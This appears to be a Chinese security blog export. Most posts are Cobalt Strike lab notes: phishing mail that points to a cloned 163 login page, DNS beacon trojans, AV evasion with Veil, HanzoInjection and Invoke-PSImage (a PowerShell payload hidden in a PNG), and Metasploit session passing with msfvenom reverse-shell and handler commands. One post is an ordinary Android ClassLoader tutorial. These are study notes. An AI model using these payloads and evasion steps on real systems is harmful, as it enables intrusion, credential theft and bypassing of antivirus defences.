<h2 id="可以看到新收到的邮件"><a href="#可以看到新收到的邮件" class="headerlink" title="可以看到新收到的邮件"></a>可以看到新收到的邮件</h2><p>​	<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602153145875.png" class="" title="image-20210602153145875"></p>
<h2 id="邮件接收正常，在圈起来的部分可以看到是由我们自己的邮箱代发的"><a href="#邮件接收正常，在圈起来的部分可以看到是由我们自己的邮箱代发的" class="headerlink" title="邮件接收正常，在圈起来的部分可以看到是由我们自己的邮箱代发的"></a>邮件接收正常，在圈起来的部分可以看到是由我们自己的邮箱代发的</h2><img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602153305382.png" class="" title="image-20210602153305382">

<h2 id="点击图片就会跳转到我们前面填入的163邮箱的登陆地址"><a href="#点击图片就会跳转到我们前面填入的163邮箱的登陆地址" class="headerlink" title="点击图片就会跳转到我们前面填入的163邮箱的登陆地址"></a>点击图片就会跳转到我们前面填入的163邮箱的登陆地址</h2><img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602153437496.png" class="" title="image-20210602153437496">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​	钓鱼右键这个功能可以配合上篇文章的网站克隆功能来使用，将我们克隆后的恶意填入Embed URL来获取信息。</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>-Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike(三)</title>
    <url>/2021/05/26/Cobalt-Strike-%E4%B8%89/</url>
    <content><![CDATA[<h2 id="Cobalt-Strike-DNS-Beacon的使用与原理"><a href="#Cobalt-Strike-DNS-Beacon的使用与原理" class="headerlink" title="Cobalt Strike DNS Beacon的使用与原理"></a>Cobalt Strike DNS Beacon的使用与原理</h2><p>这一节实验需要有一台公网vps和一个域名</p>
<span id="more"></span>

<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ol>
<li><p>dns木马</p>
<p>dns木马因为隐蔽性较好，在受害者不会开放任何端口可以规避防火墙协议，走的是53端口 (服务器)，防火墙不会拦截，缺点响应较慢。</p>
</li>
</ol>
<h3 id="1-部署域名解析"><a href="#1-部署域名解析" class="headerlink" title="1. 部署域名解析"></a>1. 部署域名解析</h3><ol>
<li><p>配置域名解析：需要添加一条A记录和一条NS记录</p>
<ul>
<li><p>A：告诉域名服务器，test.xiao（域名）指向的IP地址是多少</p>
</li>
<li><p>CN：告诉域名服务器，想要知道c1.xiao（域名）的IP就去问test.xiao（域名）</p>
<img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210531115933586.png" class="" title="image-20210531115933586"></li>
</ul>
<ol start="2">
<li>设置完成后验证一下A记录是否解析成功</li>
</ol>
<p>找一台可以联网的主机输入<code>ping test.xiao（域名）</code>：可以显示IP地址说明解析已经成功了</p>
<img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210531120351278.png" class="" title="image-20210531120351278">

<ol start="3">
<li>然后在vps开启53端口并监听试试测试CN记录是否解析成功</li>
</ol>
<ul>
<li>开启端口命令</li>
</ul>
<p><code>iptables -I INPUT -p tcp --dport 53 -j ACCEPT</code></p>
<img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526175044533.png" class="" title="image-20210526175044533">

<ul>
<li><p>监听端口命令</p>
<p><code>tcpdump -n -i any udp dst port 53</code></p>
<ul>
<li>然后在一台可以联网的主机上执行<code>nslookup c1.xiao（域名）</code>可以看到解析成功</li>
</ul>
<img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210531120506743.png" class="" title="image-20210531120506743"></li>
</ul>
</li>
</ol>
<h3 id="2-新建监听器"><a href="#2-新建监听器" class="headerlink" title="2. 新建监听器"></a>2. 新建监听器</h3><ol>
<li><p>开启cs：HOST输入我们配置好的域名</p>
<img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210531120536410.png" class="" title="image-20210531120536410">

<ol start="2">
<li>新建一个监听器</li>
</ol>
<img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210531120623036.png" class="" title="image-20210531120623036"></li>
</ol>
<h3 id="3-生成DNS木马"><a href="#3-生成DNS木马" class="headerlink" title="3. 生成DNS木马"></a>3. 生成DNS木马</h3><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526181524794.png" class="" title="image-20210526181524794">

<img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526181617435.png" class="" title="image-20210526181617435">

<h3 id="4-上线"><a href="#4-上线" class="headerlink" title="4. 上线"></a>4. 上线</h3><ol>
<li><p>将生成的木马在目标机上执行</p>
<img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526181844019.png" class="" title="image-20210526181844019">

<ol start="2">
<li>可以看到已经上线</li>
</ol>
<img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526181935501.png" class="" title="image-20210526181935501">

<ol start="3">
<li>在目标机上右键打开beacon窗口输入命令，过一会儿就可以看到主机的详细信息</li>
</ol>
<p><code>checkin</code></p>
<img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526182137564.png" class="" title="image-20210526182137564">

<img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526182646285.png" class="" title="image-20210526182646285"></li>
</ol>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>-Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>ClassLoader和动态加载</title>
    <url>/2023/08/19/ClassLoader%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<p>本章是加壳的一些前置原理，主要是基于Android8.0中ClassLoader的双亲委派模式原理和代码验证以及动态加载的代码验证</p>
<span id="more"></span>

<h2 id="类加载器ClassLoader"><a href="#类加载器ClassLoader" class="headerlink" title="类加载器ClassLoader"></a>类加载器ClassLoader</h2><p>Android的dalvik和art虚拟机都是继承于JVM的一种实现，是基于寄存器来实现的，这是和<strong>JVM</strong>不同的点</p>
<ul>
<li><p>JVM的类加载器包括三种：每一个作用都是不一样的</p>
<ol>
<li><p>Bootstrap ClassLoader（引导类加载器）：C/C++代码实现的加载器，用于<strong>加载指定的JDK的核心类库</strong>，比如java.lang、java.uti。等这些系统类。java虚拟机的启动就是通过Bootstrap，该ClassLoader在java里无法获取，负责加载*/lib*下的类，这些类在java中是没有办法获取到的。</p>
</li>
<li><p>Extensions ClassLoader（扩展类加载器）：Java中的实现类为ExtClassLoader，提供了除了系统类之外的额外功能，可以在java里获取，负责加载/lib/ext下的类。</p>
</li>
<li><p>Application ClassLoader（应用程序类加载器）：<em>java开发人员接触最多的</em>。Java中的实现类为AppClassLoader是与我们接触最多的类加载器，开发人员写的代码默认就是由它来加载，ClassLoader.getSystemClassLoader返回的就是它。</p>
</li>
<li><p>也可以自定义类加载器，只需要通过继承java.lang.ClassLoadr类的方式来实现自己的类加载器即可。</p>
<ul>
<li>加载顺序：<ol>
<li>Bootstrap ClassLoader</li>
<li>Extension ClassLoader</li>
<li>Application ClassLoader</li>
</ol>
</li>
</ul>
<img src="/2023/08/19/ClassLoader%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20230819104158555.png" class="" title="image-20230819104158555"></li>
</ol>
</li>
</ul>
<p>双亲委派：</p>
<ul>
<li>双亲委派模式的工作原理是；如果一个类加载器收到了类加载请求，他并不会自己先去加载，而是把这个委托给父类的加载器去执行，如果父类加载器还存在其自己的父类加载器，则进一步向上委托，依次递归，<strong>请求最终将到达顶层的启动类加载器</strong>，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派模式，即每个儿子都不愿意干活，每次有活就丢给父亲去干，直到父亲说这件事我也干不了时，儿子自己想办法去完成，这个就是双亲委派。</li>
<li>为什么要有双亲委派？<ol>
<li>避免重复加载，如果已经加载过一次Class，可以直接读取已经加载的Class</li>
<li>更加安全，无法自定义类来替代系统的核心类，可以防止核心API库被随意篡改</li>
</ol>
</li>
</ul>
<p>类加载：</p>
<ul>
<li><p>隐式加载：</p>
<p>创建类的实例</p>
<p>访问类的静态变量，或者为静态变量赋值</p>
<p>调用类的静态方法</p>
<p>使用反射方式来强制创建某个类或接口对应的java.lang.Class对象</p>
<p>初始化某个类的子类</p>
</li>
<li><p>显示加载：</p>
<p>使用LoadClass()加载</p>
<p>使用ForName()加载</p>
</li>
<li><p>在JVM中加载类的步骤</p>
<ol>
<li>装载：查找和导入Class文件</li>
<li>链接：其中解析步骤是可以选择的<ol>
<li>检查：检查载入的class文件数据的正确性</li>
<li>准备：给类的静态变量分配存储空间</li>
<li>解析：将符号引用转成直接引用</li>
</ol>
</li>
<li>初始化：即调用<clinit>函数，对静态变量、静态代码块执行初始化工作</clinit></li>
</ol>
<img src="/2023/08/19/ClassLoader%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20230819104826308.png" class="" title="image-20230819104826308"></li>
</ul>
<p>ClassLoader的继承关系：InMemoryDexClassLoader为Android8.0新引入的ClassLoader</p>
<img src="/2023/08/19/ClassLoader%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20230819104952543.png" class="" title="image-20230819104952543">

<ul>
<li><p>Android系统中与ClassLoader相关的一共有8个：</p>
<p>ClassLoader为抽象类；</p>
<p>BootClassLoader预加载常用类，单例模式。与Java中的BootClassLoader不同，他并不是由C/C++代码实现，而是由Java实现的；</p>
<p>BaseDexClassLoader是PathClassLoader、DexClassLoader、InMemoryDexClassLoader的父类，类加载的主要逻辑都是在BaseDexClassLoader完成的。</p>
<p>SecureClassLoader继承了抽象类ClassLoader，扩展了ClassLoader类加入了权限方面的功能，加强了安全性，其子类URLClassLoader是用URL路径从jar文件中加载类和资源。</p>
<p>其中重点关注的是PathClassLoader和DexClassLoader。</p>
<p>PathClassLoader是Android默认使用的类加载器，一个apk中的Activity等类便是在其中加载。</p>
<p><strong>DexClassLoader可以加载任意目录下的dex/jar/apk/zip文件，比PathClassLoader更灵活，是实现插件化、热修复以及dex加壳的重点。</strong></p>
<p>Android8.0新引入InMemroyDexClassLoader，从名字就可以看出是用于直接从内存中加载dex。</p>
</li>
</ul>
<p>用代码验证一下是否能获取到父类加载器：编码使用<strong>kotlin</strong></p>
<pre><code class="kotlin">package com.example.classloadertest

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        testClassLoader()
    }
    public fun testClassLoader() {
        var thisClassloader = MainActivity::class.java.classLoader // 获取当前类的类加载器
        Log.i("kanxue","thisClassLoader: " + thisClassloader)
        var parentClassloader = thisClassloader.parent // 获取父类加载器
        while (parentClassloader != null){
            Log.i("kanxue","this: " + thisClassloader + "..." + parentClassloader)
            val tmpClassloader = parentClassloader.parent // 获取父类加载器的父类加载器
            thisClassloader = parentClassloader // 更新当前类加载器为父类加载器
            parentClassloader = tmpClassloader // 更新父类加载器为父类加载器的父类加载器
        }
        Log.i("kanxue","root: " + thisClassloader) // 输出根类加载器
    }


}
</code></pre>
<p>打印结果：</p>
<pre><code>thisClassLoader: dalvik.system.PathClassLoader[DexPathList[[zip file "/data/app/com.example.classloadertest-xAcs1S3DFPHFAwYBO7fLbA==/base.apk"],nativeLibraryDirectories=[/data/app/com.example.classloadertest-xAcs1S3DFPHFAwYBO7fLbA==/lib/arm64, /system/lib64, /vendor/lib64, /system/product/lib64]]]
this: dalvik.system.PathClassLoader[DexPathList[[zip file "/data/app/com.example.classloadertest-xAcs1S3DFPHFAwYBO7fLbA==/base.apk"],nativeLibraryDirectories=[/data/app/com.example.classloadertest-xAcs1S3DFPHFAwYBO7fLbA==/lib/arm64, /system/lib64, /vendor/lib64, /system/product/lib64]]]...java.lang.BootClassLoader@29144af
root: java.lang.BootClassLoader@29144af
</code></pre>
<p>小结：</p>
<ul>
<li>这里我们简单的验证了一下双亲验证的关系，这是非常重要的一个点。如果双亲委派没有搞好，开发插件的时候当中的类会出现<em>notfoundClass</em>的问题，或者我们使用四大组件中的<strong>activity、service</strong>出现系统没有管理，不能正常工作，可能都是这个ClassLoader这个环节的问题。</li>
<li>如果写xposed插件的话会经常用到这个</li>
<li>frida框架的话会自动帮我们处理好这个问题（会通过反射帮我们找到最终app所在的classloader）</li>
</ul>
<p>接下来再写代码验证一下动态加载dex</p>
<ul>
<li><p>loaddex01</p>
<pre><code class="kotlin">package com.kanxue.loaddex01

import android.content.Context
import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import dalvik.system.DexClassLoader

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // 获取外部存储的读取权限状态
        val readPermission = checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        if (readPermission != PackageManager.PERMISSION_GRANTED) {
            // 请求外部存储的读取权限
            requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), PERMISSION_REQUEST_CODE)
        } else {
            // 已有读取权限，可以加载 DEX 文件
            val appContext = this.applicationContext
            val dexFilePath = "/sdcard/1.dex" // 这里替换为你的 DEX 文件路径
            testDexClassLoader(appContext, dexFilePath)
        }
    }

    // 权限请求回调
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array&lt;out String&gt;, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults) // 调用父类的方法

        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() &amp;&amp; grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                val appContext = this.applicationContext
                val dexFilePath = "/sdcard/1.dex" // 这里替换为你的 DEX 文件路径
                testDexClassLoader(appContext, dexFilePath)
            } else {
                // 权限被拒绝，你可以在这里处理相应的操作，如给用户一个提示等
                Log.i("TAG", "权限请求被拒绝")
            }
        }
    }


    private fun testDexClassLoader(context: Context, dexFilePath: String) {
        val optFile = context.getDir("opt_dex", 0)
        val libFile = context.getDir("lib_path", 0)

        var dexClassLoader: DexClassLoader? = null

        try {
            // 创建 DexClassLoader，用于从 DEX 文件加载类和资源
            dexClassLoader = DexClassLoader(
                dexFilePath,
                optFile.absolutePath,
                libFile.absolutePath,
                context.classLoader
            )

            // 加载类并调用方法
            val loadedClass = dexClassLoader.loadClass("com.kanxue.test.TestClass")
            val instance = loadedClass.getDeclaredConstructor().newInstance()
            val method = loadedClass.getDeclaredMethod("testFunc")
            method.invoke(instance)
        } catch (e: ClassNotFoundException) {
            e.printStackTrace()
            // 处理类未找到异常
        } catch (e: Exception) {
            e.printStackTrace()
            // 处理其他异常
        }
    }

    companion object {
        private const val PERMISSION_REQUEST_CODE = 1
    }
}
</code></pre>
</li>
<li><p>TestClass：构建一个apk，把它里面的dex拿出来用作动态加载</p>
<pre><code class="kotlin">package com.kanxue.test

import android.util.Log

public class TestClass {
    public fun testFunc() {
        Log.i("kanxue","i an from com.example.test.TestClass.testFunc")
    }
}
</code></pre>
</li>
<li><p>执行结果</p>
<img src="/2023/08/19/ClassLoader%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20230819111748251.png" class="" title="image-20230819111748251">

<ul>
<li>执行的时候第一次加载dex是失败的因为dex没有加载进去，重新运行第二次就好了。</li>
</ul>
</li>
<li><p>小结：</p>
<ul>
<li><p>这个项目有一些需要注意的点</p>
<ol>
<li><p>需要在loaddex01项目的<em>AndroidManifest.xml</em>中配置外部存储读写权限</p>
<pre><code>&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /&gt;
&lt;uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /&gt;
</code></pre>
</li>
<li><p>需要修改build.gradle文件配置</p>
<pre><code>android {
    ...
    compileSdk 33	// 新生成的项目是32需要修改到33或33以上
    }
</code></pre>
</li>
<li><p>然后就是权限问题了，需要在<em>loaddex01</em>的代码中实时获取权限，不然在Android8.0中还是读取不到我们放在外部存储卡的dex文件。</p>
</li>
</ol>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Android加壳</tag>
        <tag>加壳和运行时的机制</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt-Strike-九 免杀（一）</title>
    <url>/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<h1 id="Veil免杀"><a href="#Veil免杀" class="headerlink" title="Veil免杀"></a>Veil免杀</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>网上有很多的安装方法：安装很简单输入命令<code>sudo apt install veil</code>然后一直确定下一步就可以了，安装时间较长</p>
<span id="more"></span>

<p><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/34.html">安装方法</a></p>
<p>安装的过程中先使用CS生成一个payload</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603175954456.png" class="" title="image-20210603175954456">

<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603180034103.png" class="" title="image-20210603180034103">

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>安装完成后输入<code>veil</code>可以启动veil工具</p>
<ul>
<li>安装完成可以看到有 Evasion和Ordnace 两个工具：Evasion是用来做==文件免杀==的一般来说选用的比较多</li>
</ul>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603172156128.png" class="" title="image-20210603172156128">

<p>输入<code>use 1</code>选用Evasion</p>
<p><code>list</code>查看可用的payloads</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603173115641.png" class="" title="image-20210603173115641">

<p>输入<code>use 17</code>这里我们选择一个go 的注入payload</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603175156926.png" class="" title="image-20210603175156926">

<p>输入<code>generate</code>选择生成payload</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603175316286.png" class="" title="image-20210603175316286">

<p>输入<code>3</code>选择自定义类型字符串，然后将我们前面生成的payload放进去回车执行</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603180319964.png" class="" title="image-20210603180319964">

<p>然后再给输入个名字：不需要输入后缀名</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603180433135.png" class="" title="image-20210603180433135">

<p>将生成后的文件拷贝出来拿到vt上查杀一下</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603180639766.png" class="" title="image-20210603180639766">

<p>被一大半的杀软检测出来了(安装了360和火绒也过不去，会直接被检测出来)</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603180948241.png" class="" title="image-20210603180948241">

<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603181020402.png" class="" title="image-20210603181020402">

<h1 id="HanzoInjection-方法"><a href="#HanzoInjection-方法" class="headerlink" title="HanzoInjection 方法"></a>HanzoInjection 方法</h1><p>HanzoIjection 是一种工具，专注于在内存中注入任意代码以绕过常见的防病毒解决方案</p>
<p><a href="https://github.com/P0cL4bs/hanzoInjection">下载链接</a></p>
<pre><code>Arguments Options:

        OPTION        TYPE       DESCRIPTION
       -e,--execute  [.raw]      Name of file.bin, payload metasploit type raw
       -p,--payload  [.raw]      Payload meterpreter type [RAW]  requered parameter -o [output]
       -o,--output   [file.cs]   Output generate project file.cs injection memory payload c#
       -h,--help     [Help]      show this help and exit

Example Usage:

        HanzoInjection.exe -e payload_meterpreter.bin
        HanzoInjection.exe -p meterpreter.bin -o injection_memory.cs
</code></pre>
<ol>
<li><p>用CS先生成一个二进制的bin文件</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606165614118.png" class="" title="image-20210606165614118">
</li>
<li><p>在安装过杀软的目标机器上用hanzoljection加载执行</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606165849918.png" class="" title="image-20210606165849918">
</li>
<li><p>执行成功，并在服务端上线成功</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606170014912.png" class="" title="image-20210606170014912"></li>
</ol>
<h1 id="Invoke-PSImage"><a href="#Invoke-PSImage" class="headerlink" title="Invoke-PSImage"></a>Invoke-PSImage</h1><p>在 PNG 文件的像素中对 PowerShell 脚本进行编码，并生成要执行的 oneliner</p>
<p>Invoke-PSImage 使用 PowerShell 脚本并将脚本的字节编码为 PNG 图像的像素。它生成一个oneliner，用于从网络上的文件或文件中执行。</p>
<p>它可以仅使用有效载荷数据创建新图像，也可以将有效载荷嵌入现有图像的最低有效字节中，使其看起来像一张真实的图片。图像保存为 PNG，并且可以无损压缩而不会影响执行有效负载的能力，因为数据存储在颜色本身中。创建新图像时，普通的 PowerShell 脚本实际上会被显着压缩，通常会生成文件大小约为原始脚本 50% 的 png。</p>
<p>使用嵌入方法，每个像素中 2 个颜色值的最低有效 4 位用于保存有效负载。图像质量会因此而受到影响，但看起来仍然不错。它可以接受大多数图像类型作为输入，但输出将始终是 PNG，因为它需要无损。图像的每个像素用于保存一个字节的脚本，因此您将需要一个像素数至少与脚本中的字节数一样多的图像。这相当容易——例如，Invoke-Mimikatz 适合 1920x1200 图像。</p>
<p><a href="https://github.com/peewpw/Invoke-PSImage">下载地址</a></p>
<p>下载并解压后先往目录里面导入两个文件</p>
<ol>
<li><p>1920x1200的图片</p>
</li>
<li><p>cs生成的一个powershell脚本</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606174420618.png" class="" title="image-20210606174420618">
</li>
<li><p>开始执行命令</p>
</li>
</ol>
<pre><code class="powershell">Powershell -ExecutionPolicy Bypass	// 允许导入外部脚本执行
Import-Module .\Invoke-PSImage.ps1
Invoke-PSImage -Script .\payload.ps1 -Image .\test_1.jpg –Out test_2.png –web
</code></pre>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606183056654.png" class="" title="image-20210606183056654">

<ol start="4">
<li>将图片上传至CS服务器</li>
</ol>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606183557547.png" class="" title="image-20210606183557547">



<ol start="5">
<li><p>执行完最后一条命令（时间比较久得几分钟）后会产生一个链接将链接复制出来</p>
</li>
<li><p>并且将圈起来的地方替换为我们cs服务端图片存放位置的链接</p>
</li>
</ol>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606183307333.png" class="" title="image-20210606183307333">

<ol start="7">
<li>替换后，在目标机上用powershell执行命令后可以看到360和火绒没有任何拦截上线成功</li>
</ol>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606183733739.png" class="" title="image-20210606183733739">

<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606184238473.png" class="" title="image-20210606184238473">

<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606184334467.png" class="" title="image-20210606184334467">



<h1 id="python-生成免杀"><a href="#python-生成免杀" class="headerlink" title="python 生成免杀"></a>python 生成免杀</h1><p>生成python文件</p>
<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606185136044.png" class="" title="image-20210606185136044">

<img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606185200136.png" class="" title="image-20210606185200136">



<p>然后使用pyinstaller进行免杀</p>
<pre><code class="css">pyinstaller -F -w -i 1.exe payload.py
-i 代表选取的图标的名字 也可以为1.ico
-f 表示生成一个单的文件
-w表示在windows环境下不打开窗口运行 
payload.py即表示文件生成的
</code></pre>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>-Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt-Strike-五</title>
    <url>/2021/05/28/Cobalt-Strike-%E4%BA%94/</url>
    <content><![CDATA[<h2 id="Cobalt-Strike会话管理"><a href="#Cobalt-Strike会话管理" class="headerlink" title="Cobalt Strike会话管理"></a>Cobalt Strike会话管理</h2><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><table>
<thead>
<tr>
<th>系统</th>
<th>服务</th>
<th>ip</th>
</tr>
</thead>
<tbody><tr>
<td>kali</td>
<td>teamserver1</td>
<td>192.168.3.51</td>
</tr>
<tr>
<td>kali</td>
<td>teamserver2</td>
<td>192.168.3.8</td>
</tr>
<tr>
<td>win7</td>
<td>target</td>
<td>192.168.3.49</td>
</tr>
<tr>
<td>winXP</td>
<td>target</td>
<td>192.168.3.52</td>
</tr>
</tbody></table>
<span id="more"></span>

<h4 id="一-cs派生会话-会话备份"><a href="#一-cs派生会话-会话备份" class="headerlink" title="一. cs派生会话(会话备份)"></a>一. cs派生会话(会话备份)</h4><p>​	可以增加自身会话，也可以将会话备份到其它teamserver，基本都是一样的操作</p>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210528231421947.png" class="" title="image-20210528231421947">

<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210528231509051.png" class="" title="image-20210528231509051">

<h4 id="二-cobalt-strike派生给metasploit会话"><a href="#二-cobalt-strike派生给metasploit会话" class="headerlink" title="二. cobalt strike派生给metasploit会话"></a>二. cobalt strike派生给metasploit会话</h4><ol>
<li><p>在msf中创建监听会话</p>
<pre><code>msf5 &gt; use exploit/multi/handler
[*] Using configured payload windows/meterpreter/reverse_http
msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set lhost 192.168.3.51
lhost =&gt; 192.168.3.51
msf5 exploit(multi/handler) &gt; set lport 901
lport =&gt; 901
msf5 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 5.
[*] Exploit completed, but no session was created.

[-] Handler failed to bind to 192.168.3.51:901:-  -
[-] Handler failed to bind to 0.0.0.0:901:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:901).
msf5 exploit(multi/handler) &gt; set lport 902
lport =&gt; 902
msf5 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 6.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.3.51:902 
</code></pre>
</li>
<li><p>创建完成后在CS中创建监听会话因为上面我们在msf中创建的监听会话是tcp的所以在CS中也要同样创建tcp的监听</p>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531150219471.png" class="" title="image-20210531150219471">
</li>
<li><p>右键点击需要派生的shell，点击派生</p>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531150701696.png" class="" title="image-20210531150701696">
</li>
<li><p>选择我们刚刚配置的监听器</p>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531150810902.png" class="" title="image-20210531150810902">
</li>
<li><p>执行过后稍等一会儿MSF里面就会产生会话</p>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531150940137.png" class="" title="image-20210531150940137"></li>
</ol>
<h4 id="三-metasploit生成木马，在CS上监听会话"><a href="#三-metasploit生成木马，在CS上监听会话" class="headerlink" title="三. metasploit生成木马，在CS上监听会话"></a>三. metasploit生成木马，在CS上监听会话</h4><ol>
<li><p>使用命令生成一个回连木马</p>
<p><code>msf5 &gt; msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.3.51 LPORT=903 -f exe &gt; /tmp/shell1.exe</code></p>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531152527725.png" class="" title="image-20210531152527725">

<ol start="2">
<li>在cs创建监听器监听这个端口</li>
</ol>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531152644410.png" class="" title="image-20210531152644410">

<ol start="3">
<li>把msf刚刚生成的木马拿到目标机上执行</li>
</ol>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531152801125.png" class="" title="image-20210531152801125">

<ol start="4">
<li>可以看到在cs上返回了一个会话</li>
</ol>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531152903656.png" class="" title="image-20210531152903656"></li>
</ol>
<h4 id="四-metasploit使用溢出exp与cobalt-strike会话"><a href="#四-metasploit使用溢出exp与cobalt-strike会话" class="headerlink" title="四. metasploit使用溢出exp与cobalt strike会话"></a>四. metasploit使用溢出exp与cobalt strike会话</h4><ol>
<li><p>使用MSF创建一个溢出类型的exp</p>
<pre><code>msf5 &gt; use exploit/windows/browser/ms14_064_ole_code_execution
[*] Using configured payload windows/meterpreter/reverse_http
